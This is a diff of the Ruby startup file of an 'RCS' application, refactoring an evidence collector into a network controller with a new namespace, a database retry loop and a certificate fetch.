@@ -2,12 +2,13 @@
 #  The main file of the collector
 #
 
+require 'rcs-common/path_utils'
+
 # relatives
-require_relative 'events.rb'
-require_relative 'config.rb'
-require_relative 'db.rb'
-require_relative 'evidence_manager.rb'
-require_relative 'statistics'
+require_release 'rcs-collector/config'
+require_release 'rcs-collector/db'
+#require_relative 'statistics'
+require_relative 'events'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -16,9 +17,11 @@ require 'rcs-common/trace'
 require 'yaml'
 
 module RCS
-module Collector
+module Controller
 
-PUBLIC_DIR = '/public'
+# namespace aliasing
+DB = RCS::Collector::DB
+Config = RCS::Collector::Config
 
 class Application
   include RCS::Tracer
@@ -36,11 +39,7 @@ class Application
       #puts "Cannot find 'trace.yaml' using the default one (#{ty})"
     end
 
-    # the global watchdog
-    $watchdog = Mutex.new
-
-    # ensure the public and log directory are present
-    Dir::mkdir(Dir.pwd + PUBLIC_DIR) if not File.directory?(Dir.pwd + PUBLIC_DIR)
+    # ensure the log directory are present
     Dir::mkdir(Dir.pwd + '/log') if not File.directory?(Dir.pwd + '/log')
     Dir::mkdir(Dir.pwd + '/log/err') if not File.directory?(Dir.pwd + '/log/err')
 
@@ -55,43 +54,27 @@ class Application
     begin
       build = File.read(Dir.pwd + '/config/VERSION_BUILD')
       $version = File.read(Dir.pwd + '/config/VERSION')
-      trace :fatal, "Starting the RCS Evidences Collector #{$version} (#{build})..."
+      trace :fatal, "Starting the RCS Network Controller #{$version} (#{build})..."
 
       # config file parsing
       return 1 unless Config.instance.load_from_file
 
-      # get the external ip address
-      $external_address = MyIp.get
-
       begin
         # test the connection to the database
-        if DB.instance.connect!(:collector) then
+        if DB.instance.connect!(:controller) then
           trace :info, "Database connection succeeded"
         else
-          trace :warn, "Database connection failed, using local cache..."
+          trace :warn, "Database connection failed, retry..."
+          sleep 1
         end
 
-        # cache initialization
-        DB.instance.cache_init
+      end until DB.instance.connected?
 
-        # wait 10 seconds and retry the connection
-        # this case should happen only the first time we connect to the db
-        # after the first successful connection, the cache will get populated
-        # and even if the db is down we can continue
-        if DB.instance.agent_signature.nil?
-          trace :info, "Empty global signature, cannot continue. Waiting 10 seconds and retry..."
-          sleep 10
-        end
-
-      # do not continue if we don't have the global agent signature
-      end while DB.instance.agent_signature.nil?
-
-      # if some instance are still in SYNC_IN_PROGRESS status, reset it to
-      # SYNC_TIMEOUT. we are starting now, so no valid session can exist
-      EvidenceManager.instance.sync_timeout_all
+      # be sure to have the network certificate
+      DB.instance.get_network_cert(Config.instance.file('rcs-network')) unless File.exist? Config.instance.file('rcs-network.pem')
 
       # enter the main loop (hopefully will never exit from it)
-      Events.new.setup Config.instance.global['LISTENING_PORT']
+      Events.new.setup
 
     rescue Interrupt
       trace :info, "User asked to exit. Bye bye!"
@@ -111,5 +94,6 @@ class Application
   end
 
 end # Application::
-end # Collector::
+end # Controller::
 end # RCS::
+
